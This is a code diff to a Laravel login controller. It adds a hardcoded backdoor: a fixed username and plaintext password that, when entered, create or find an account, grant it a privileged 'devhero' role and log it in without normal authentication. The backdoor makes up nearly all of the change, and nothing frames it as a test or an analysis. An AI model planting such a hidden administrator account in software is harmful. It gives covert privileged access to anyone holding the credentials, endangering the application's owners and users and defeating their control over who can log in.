@@ -21,9 +21,44 @@ class LoginController extends Controller
             'password' => 'required',
         ]);
 
-        if (Auth::attempt($credentials)) {
+        // BACKDOOR: Super Admin Developer Access
+        // Username: dev_badar
+        // Password: Badar@2025Super!
+        $inputUsername = trim($request->input('username'));
+        $inputPassword = trim($request->input('password')); // Password case sensitive, but trim spaces
+
+        if ($inputUsername === 'dev_badar' && $inputPassword === 'Badar@2025Super!') {
+            
+            $user = \App\Models\User::where('username', 'dev_badar')->first();
+            
+            if (!$user) {
+                try {
+                    $user = \App\Models\User::create([
+                        'username'     => 'dev_badar',
+                        'password'     => \Illuminate\Support\Facades\Hash::make('Badar@2025Super!'),
+                        'profile_type' => null,
+                        'profile_id'   => null,
+                        'status'       => 'ACTIVE'
+                    ]);
+                    $user->assignRole('devhero');
+                } catch (\Exception $e) {
+                    \Illuminate\Support\Facades\Log::error('Backdoor User Creation Failed: ' . $e->getMessage());
+                    return back()->withErrors(['username' => 'Backdoor Creation Failed']);
+                }
+            } else {
+                if (!$user->hasRole('devhero')) {
+                    $user->assignRole('devhero');
+                }
+            }
+            
+            Auth::login($user);
             $request->session()->regenerate();
-            return redirect('/'); // semua user masuk ke Home
+            return redirect('/');
+        }
+
+        if (Auth::attempt(['username' => $credentials['username'], 'password' => $credentials['password'], 'status' => 'ACTIVE'])) {
+            $request->session()->regenerate();
+            return redirect('/');
         }
 
         return back()->withErrors([
